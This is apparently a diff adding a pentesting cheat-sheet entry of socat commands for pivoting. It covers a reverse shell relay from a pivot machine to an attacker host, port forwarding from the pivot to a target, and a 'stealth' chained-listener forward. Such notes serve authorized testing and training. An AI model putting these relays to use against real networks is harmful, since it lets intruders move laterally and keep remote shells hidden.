@@ -1,0 +1,11 @@
+% forward, proxy
+
+# Reverse shell relay (on pivot machine)
+socat tcp-l:<pivotlocalport> tcp:<attackip>:<attackport> &
+
+# Port Forwarding on pivot host to target
+socat tcp-l:<pivotport>,fork,reuseaddr tcp:<targetip>:<targetport>
+
+# Stealth/Quiet Port Forwarding on pivot host to target
+socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+echo "socat tcp:<attackip>:8001 tcp:<targetip>:<targetport>,fork &"
